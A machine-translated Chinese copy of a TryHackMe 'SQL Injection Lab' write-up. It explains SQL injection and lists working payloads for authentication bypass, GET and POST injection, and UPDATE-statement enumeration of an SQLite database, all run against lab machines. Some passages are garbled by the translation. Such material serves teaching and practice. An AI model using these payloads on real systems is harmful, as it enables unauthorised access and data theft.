<html>
<head>
<title>SQL Injection Lab Tryhackme Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">SQL注入实验室Tryhackme书面报告</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/sql-injection-lab-tryhackme-writeup-fcf30f846e82?source=collection_archive---------0-----------------------#2021-04-20">https://infosecwriteups.com/sql-injection-lab-tryhackme-writeup-fcf30f846e82?source=collection_archive---------0-----------------------#2021-04-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="4f6b" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated"><strong class="ak">这是Tryhackme工作室“SQL注入实验室”的一篇文章</strong></h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/127cd388c4071b3b7de77c8693ce1e8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*DA0hBMnMsKkhHvPXXmGDjw.png"/></div><figcaption class="kn ko gj gh gi kp kq bd b be z dk translated">【https://tryhackme.com/room/sqlilab T2】号</figcaption></figure><p id="dabc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">房间链接:</strong><a class="ae kr" href="https://tryhackme.com/room/sqlilab" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/sqlilab</a><br/><strong class="ku ir">注:此房免费</strong></p><p id="27dc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在你完成这个记录之前，先完成这个房间</p><h2 id="0576" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated"><a class="ae kr" href="https://shamsher-khan.medium.com/sql-injection-tryhackme-writeup-e7c78542bfb9" rel="noopener"> SQL注入Tryhackme写文章</a></h2><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/8d85d6e94c74541d10ee355bdeb0c184.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/0*ehSa9dUz2t1KOcVt.png"/></div><figcaption class="kn ko gj gh gi kp kq bd b be z dk translated"><a class="ae kr" href="https://shamsher-khan.medium.com/sql-injection-tryhackme-writeup-e7c78542bfb9" rel="noopener">https://shams her-Khan . medium . com/SQL-injection-tryhackme-writeup-e7c 78542 bfb 9</a></figcaption></figure><h1 id="e73e" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务SQL注入简介:第1部分</h1><p id="51a1" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">SQL注入是一种技术，通过这种技术，攻击者可以执行他们自己的恶意SQL语句，通常称为恶意负载。通过恶意的SQL语句，攻击者可以从受害者的数据库中窃取信息；更糟糕的是，他们可能能够对数据库进行更改。我们的员工管理web应用程序有SQL注入漏洞，它模仿了开发人员经常犯的错误。</p><p id="2fb4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">应用程序通常需要动态SQL查询来根据用户设置的不同条件显示内容。为了支持动态SQL查询，开发人员通常将用户输入直接连接到SQL语句中。如果不对接收到的输入进行检查，字符串连接将成为导致SQL注入漏洞的最常见错误。如果没有输入敏感性，用户可以让数据库将用户输入解释为SQL语句，而不是数据。换句话说，攻击者必须能够访问一个他们可以控制的参数，这个参数将进入SQL语句。通过控制参数，攻击者可以注入恶意查询，该查询将由数据库执行。如果应用程序没有从攻击者控制的参数中清理给定的输入，查询将容易受到SQL注入攻击。</p><p id="1ae8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下面的PHP代码演示了从。来自POST请求的用户和密码变量被直接连接到SQL语句中。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="0145" class="lo lp iq mz b gy nd ne l nf ng">$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"</span></pre><p id="5442" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果攻击者在name参数中提供值“OR 1=1”，查询可能会返回多个用户。大多数应用程序将处理返回的第一个用户，这意味着攻击者可以利用这一点，并作为查询返回的第一个用户登录。双破折号(—)序列是SQL中的注释指示符，导致查询的其余部分被注释掉。在SQL中，字符串包含在单引号(')或双引号(")中。输入中的单引号(')用于结束字符串文字。如果攻击者在name参数中输入' OR 1 = 1--，并将密码留空，那么上面的查询将产生下面的SQL语句。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="fcdc" class="lo lp iq mz b gy nd ne l nf ng">SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''</span></pre><p id="7a5f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果数据库执行上面的SQL语句，将返回users表中的所有用户。因此，攻击者绕过应用程序的身份验证机制，作为查询返回的第一个用户登录。</p><p id="4186" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用— —而不是——的原因主要是因为MySQL处理双破折号注释样式的方式。</p><p id="390e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">从序列到行尾。在MySQL中——(双破折号)注释样式要求第二个破折号后面至少跟一个空格或控制字符(比如空格、制表符、换行符等等)。这种语法与标准的SQL注释语法略有不同，如1.7.2.4章节“作为注释的开始”中所讨论的。(<a class="ae kr" href="https://dev.mysql.com/doc/refman/8.0/en/comments.html" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir"/></a><strong class="ku ir">)</strong></p><p id="f8e2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">内联SQL注释最安全的解决方案是使用— <space> <any character="">比如—，因为如果它被URL编码成—% 20—它仍然会被解码为—。更多信息，请参见:<a class="ae kr" href="https://blog.raw.pm/en/sql-injection-mysql-comment/" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir"/></a></any></space></p><p id="19ea" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">SQL注入1:输入框非字符串</p><p id="eb7a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当用户登录时，应用程序执行以下查询:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="18e7" class="lo lp iq mz b gy nd ne l nf ng">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'</span></pre><p id="91c6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">登录时，用户向profileID参数提供输入。对于这个挑战，参数接受一个整数，如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="d3c5" class="lo lp iq mz b gy nd ne l nf ng">profileID=10</span></pre><p id="df46" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">因为没有输入清理，所以可以通过使用任何真条件(例如下面的条件)作为ProfileID来绕过登录</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="2959" class="lo lp iq mz b gy nd ne l nf ng">1 or 1=1-- -</span></pre><p id="2662" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">绕过登录并检索标志。</p><p id="62d6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">SQL注入2:输入框字符串</p><p id="78f8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这个挑战使用与前一个挑战相同的查询。但是，该参数需要的是字符串而不是整数，如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="8ae3" class="lo lp iq mz b gy nd ne l nf ng">profileID='10'</span></pre><p id="af21" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">因为它需要一个字符串，所以我们需要修改我们的有效负载来稍微绕过登录。下面一行将让我们进入:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6004" class="lo lp iq mz b gy nd ne l nf ng">1' or '1'='1'-- -</span></pre><p id="02b1" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">绕过登录并检索标志。</p><p id="0f2f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">SQL注入3和4: URL和POST注入</p><p id="748c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这里，SQL查询与前一个相同:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="ec7b" class="lo lp iq mz b gy nd ne l nf ng">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='10' AND password='ce5ca67...'</span></pre><p id="4bff" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是在这种情况下，恶意用户输入不能通过登录表单直接注入到应用程序中，因为已经实现了一些客户端控件:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="a16d" class="lo lp iq mz b gy nd ne l nf ng">function <strong class="mz ir">validateform</strong>() {</span><span id="ef9b" class="lo lp iq mz b gy nh ne l nf ng">var profileID = document.inputForm.profileID.value;</span><span id="c51c" class="lo lp iq mz b gy nh ne l nf ng">var password = document.inputForm.password.value;</span><span id="857f" class="lo lp iq mz b gy nh ne l nf ng">if (/^[a-zA-Z0-9]*$/.<strong class="mz ir">test</strong>(profileID) == false || /^[a-zA-Z0-9]*$/.<strong class="mz ir">test</strong>(password) == false) {</span><span id="c617" class="lo lp iq mz b gy nh ne l nf ng"><strong class="mz ir">alert</strong>("The input fields cannot contain special characters");</span><span id="e014" class="lo lp iq mz b gy nh ne l nf ng">return false;</span><span id="1b37" class="lo lp iq mz b gy nh ne l nf ng">}</span><span id="bf6f" class="lo lp iq mz b gy nh ne l nf ng">if (profileID == null || password == null) {</span><span id="ca81" class="lo lp iq mz b gy nh ne l nf ng"><strong class="mz ir">alert</strong>("The input fields cannot be empty.");</span><span id="3ed9" class="lo lp iq mz b gy nh ne l nf ng">return false;</span><span id="1ab4" class="lo lp iq mz b gy nh ne l nf ng">}</span><span id="dd79" class="lo lp iq mz b gy nh ne l nf ng">}</span></pre><p id="1ed9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">上面的JavaScript代码要求profileID和密码只包含a-z、A-Z和0–9之间的字符。客户端控件只是为了改善用户体验，并不是一种安全功能，因为用户可以完全控制客户端及其提交的数据。比如可以使用Burp Suite这样的代理工具绕过客户端JavaScript验证<strong class="ku ir">(</strong><a class="ae kr" href="https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">https://ports wigger . net/support/using-Burp-to-bypass-client-side-JavaScript-validation</strong></a><strong class="ku ir">)</strong>。</p><p id="9b27" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">q . 1</strong>:SQL注入1:输入框非字符串的标志是什么？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/623a215d34b33ea05f1abea2389db991.png" data-original-src="https://miro.medium.com/v2/resize:fit:880/format:webp/1*_zBLd5uA0R0e-8sVjLFCYg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nj"><img src="../Images/09f2f370326107e6067975beebda043b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FNCxvt4_YIVX8U19a-NTTg.png"/></div></div></figure><p id="ec66" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">q . 2</strong>:SQL注入2:输入框字符串的标志是什么？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi no"><img src="../Images/bd9ce2b3722ca72811201a7e0d0d6692.png" data-original-src="https://miro.medium.com/v2/resize:fit:802/format:webp/1*RE4bjSYtLWv8iENX0UVvdA.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi np"><img src="../Images/7ec5686758f4752288728f1d154835f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Pg66tuZf4E9-Lzs701-uSg.png"/></div></div></figure><p id="942e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">q . 3</strong>:SQL注入3: URL注入的标志是什么？</p><p id="2b85" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">此挑战在提交登录表单时使用GET请求，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nq"><img src="../Images/455af003bd371791684cab4673aa3731.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*B4zb_JSSE2qJo-dr.png"/></div></div></figure><p id="8d27" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过直接访问以下URL，可以轻松绕过登录和客户端验证:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="1a04" class="lo lp iq mz b gy nd ne l nf ng"><a class="ae kr" href="http://10.10.231.136:5000/sesqli3/login?profileID=-1'" rel="noopener ugc nofollow" target="_blank">http://10.10.231.136:5000/sesqli3/login?profileID=</a>a' or 1=1 --a' or 1=1 --&amp;password=a</span></pre><p id="a71a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">浏览器会自动为我们进行URL编码。因为HTTP协议不支持请求中的所有字符，所以需要Urlencoding。进行urlencoded时，URL如下所示:</p><p id="463b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用<strong class="ku ir"> HackBar 2扩展</strong>将您的有效负载转换成urlencode</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nr"><img src="../Images/154f7183ea1825ec7c3bba45fa66ff07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DAjl9JArXrlj5VsXiNFbyg.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi gj"><img src="../Images/99598492b5faba5d7ba21754a4557ba2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*atU5YS_ZtzGbqDe0h6XWdA.png"/></div></div></figure><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="0e6b" class="lo lp iq mz b gy nd ne l nf ng">a'%20or%201%3d1%20--</span><span id="0ccb" class="lo lp iq mz b gy nh ne l nf ng">10.10.231.136:5000/sesqli3/login?profileID=a'%20or%201%3d1%20--&amp;password=a</span></pre><p id="7d9d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">%27变成单引号(')，而%20变成空格。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/654d9a743bcc0b06a50b7f5662be3929.png" data-original-src="https://miro.medium.com/v2/resize:fit:1366/format:webp/1*VbuRknj4tyAy-s52C1O75g.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/6eae6cc5013ff6c39bc41f5d2f175ead.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rcdLL7cVfb6-1M-jZhHQGg.png"/></div></div></figure><p id="fa21" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">q . 4</strong>:SQL注入4: POST注入的标志是什么？</p><p id="bdd6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir"> SQL注入4: POST注入</strong>在提交这个挑战的登录表单时，它使用HTTP POST方法。可以删除/禁用验证登录表单的JavaScript，或者提交一个有效的请求并用代理工具(如Burp Suite)拦截并修改它:</p><p id="bc0b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着url将不显示任何参数</p><p id="60f3" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这就是为什么我们使用burpsuite来查看参数并更改它</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/c62f924c22afdb2516c587b345bcd87a.png" data-original-src="https://miro.medium.com/v2/resize:fit:692/format:webp/1*LQIfFq-U4fKRkWnN60V8-Q.png"/></div></figure><p id="d6dc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">捕获请求</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/cfea0ff53cc511db0446070df6dd0ebf.png" data-original-src="https://miro.medium.com/v2/resize:fit:928/format:webp/1*Ro7I30HFzkt-TY5UNWC-0A.png"/></div></figure><p id="fc6f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">用<strong class="ku ir">a’或1=1 — </strong>更改profileID</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/5083c5f7b1f963ff0df5b7ab78704c9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*pdVyx4kgYEsjBjsqXtfmvw.png"/></div></figure><p id="0218" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">并点击转发</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nx"><img src="../Images/d2812957736706ec61b979df96db7477.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xl00q6nHWbu5oSvsrRpVIw.png"/></div></div></figure></div><div class="ab cl ny nz hu oa" role="separator"><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od"/></div><div class="ij ik il im in"><h1 id="d52d" class="mi lp iq bd lq mj of ml lt mm og mo lw jw oh jx lz jz oi ka mc kc oj kd mf ms bi translated">任务SQL注入简介:第2部分</h1><p id="81e1" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">登录“SQL注入5:更新语句”挑战并利用易受攻击的配置文件页面来查找标志。可以使用的凭据有:</p><p id="0a62" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">profileID: <strong class="ku ir"> 10 </strong></p><p id="0ffd" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">密码:<strong class="ku ir">工具或</strong></p><p id="8a2c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这里必须完成为查找表和列名而演示的相同枚举，因为标志存储在另一个表中。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/36f3f19468b2886d43723828111c0049.png" data-original-src="https://miro.medium.com/v2/resize:fit:842/format:webp/1*7eGK7OWc_iyCsFSOIAae4A.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ol"><img src="../Images/df529f0acac9febf1b35cdc90451892f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jicvqLe20ETQ000UQxqqjQ.png"/></div></div></figure><h2 id="d2b9" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">对更新语句的SQL注入攻击</h2><p id="9b6c" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">如果SQL注入发生在UPDATE语句上，损害可能会严重得多，因为它允许用户更改数据库中的记录。在员工管理应用程序中，有一个编辑个人资料页面，如下图所示。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi om"><img src="../Images/9f5948105f5c3de7bec7fbc656ad05d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:708/format:webp/0*zNIUrHPajocsbmy-.png"/></div></figure><p id="f3da" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">此编辑页面允许员工更新他们的信息，但他们不能访问所有可用字段，用户只能更改他们的信息。如果表单易受SQL注入攻击，攻击者可以绕过实现的逻辑，更新他们不应该更新的字段，或者为其他用户更新字段。</p><p id="f068" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们现在将通过配置文件页面上的UPDATE语句来枚举数据库。我们将假设我们没有数据库的先验知识。通过查看网页的源代码，我们可以通过查看name属性来识别潜在的列名。这些列不一定需要命名为this，但是很有可能命名为this，而且像“email”和“password”这样的列名并不少见，很容易被猜到。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi on"><img src="../Images/6fcc8e00e22c6aa752444d7c37be618f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*AxVJa5VzNjj_gC2y.png"/></div></div></figure><p id="5453" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">为了确认表单易受攻击并且我们有有效的列名，我们可以尝试在昵称和电子邮件字段中插入类似以下代码的内容:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="f9bb" class="lo lp iq mz b gy nd ne l nf ng">asd',nickName='test',email='hacked</span></pre><p id="55e6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当将恶意有效载荷注入昵称字段时，仅更新昵称。当注入电子邮件字段时，两个字段都会更新:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/bf6fcbda98c0a8ef550e5e65ed6ab59b.png" data-original-src="https://miro.medium.com/v2/resize:fit:846/format:webp/1*XCKHrW-C2yhyI8Nqx93IoQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi op"><img src="../Images/7c2916caab17d0aa630fcb31855a6b90.png" data-original-src="https://miro.medium.com/v2/resize:fit:858/format:webp/0*chE7RxRvfUO78b28.png"/></div></figure><p id="d81c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">第一个测试确认了应用程序易受攻击，并且我们有正确的列名。如果我们有错误的列名，那么任何字段都不会被更新。由于这两个字段都是在注入恶意负载后更新的，因此原始SQL语句可能类似于以下代码:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6d8c" class="lo lp iq mz b gy nd ne l nf ng">UPDATE &lt;table_name&gt; SET nickName='name', email='email' WHERE &lt;condition&gt;</span></pre><p id="822e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">有了这些知识，我们就可以尝试识别正在使用的数据库。有几种方法可以做到这一点，但最简单的方法是让数据库识别自己。以下查询可用于识别MySQL、MSSQL、Oracle和SQLite:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="9f69" class="lo lp iq mz b gy nd ne l nf ng"><strong class="mz ir"><em class="oq"># MySQL and MSSQL</em></strong></span><span id="4802" class="lo lp iq mz b gy nh ne l nf ng">',nickName=@@version,email='</span><span id="5ec7" class="lo lp iq mz b gy nh ne l nf ng"><strong class="mz ir"><em class="oq"># For Oracle</em></strong></span><span id="2e11" class="lo lp iq mz b gy nh ne l nf ng">',nickName=(SELECT banner FROM v$version),email='</span><span id="aa1a" class="lo lp iq mz b gy nh ne l nf ng"><strong class="mz ir"><em class="oq"># For SQLite</em></strong></span><span id="cafa" class="lo lp iq mz b gy nh ne l nf ng">',nickName=sqlite_version(),email='</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi no"><img src="../Images/d9b6329688cd8043947b08086008462e.png" data-original-src="https://miro.medium.com/v2/resize:fit:802/format:webp/1*LcXTZX8o0go14Z_mV3sN3g.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi or"><img src="../Images/ea0e7020693738fac3979b5626281e51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h3aMy7mXY0Gr8-yWcgOkgA.png"/></div></div></figure><p id="2209" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">知道我们在处理什么样的数据库，就更容易理解如何构造我们的恶意查询。我们可以通过提取所有的表来枚举数据库。在下面的代码中，我们执行一个子查询来从数据库中获取所有的表，并将它们放入昵称字段中。子查询包含在参数中。<a class="ae kr" href="https://sqlite.org/lang_aggfunc.html#groupconcat" rel="noopener ugc nofollow" target="_blank"> group_concat() </a>函数用于同时转储所有的表。</p><blockquote class="os ot ou"><p id="190a" class="ks kt oq ku b kv kw jr kx ky kz ju la ov lc ld le ow lg lh li ox lk ll lm ln ij bi translated"><em class="iq">"</em><strong class="ku ir"><em class="iq"/></strong><a class="ae kr" href="https://sqlite.org/lang_aggfunc.html#groupconcat" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir"><em class="iq">group _ concat()</em></strong></a><em class="iq">函数返回一个字符串，该字符串是x的所有非空值的串联。如果参数Y存在，则它用作x实例之间的分隔符。如果省略Y，则逗号("，")用作分隔符。连接元素的顺序是任意的。</em></p></blockquote><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="94a6" class="lo lp iq mz b gy nd ne l nf ng">',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oy"><img src="../Images/6cd9ffc0a44e21c80ced4cf080b07cb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:818/format:webp/1*tUnU-ZBpZRGeqOs8DanS8w.png"/></div></div></figure><p id="fb8d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过注入上面的代码，我们可以看到数据库中唯一的表叫做"<strong class="ku ir"> usertable </strong>和"<strong class="ku ir"> secrets" </strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oz"><img src="../Images/89a9fc49ef632effaa4cecc1263d3f28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2atoIHoEp2M6UPotVB4gZg.png"/></div></div></figure><p id="75e1" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然后我们可以继续从<strong class="ku ir">用户表:</strong>中提取所有的列名</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="ca2e" class="lo lp iq mz b gy nd ne l nf ng">',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='</span></pre><figure class="kg 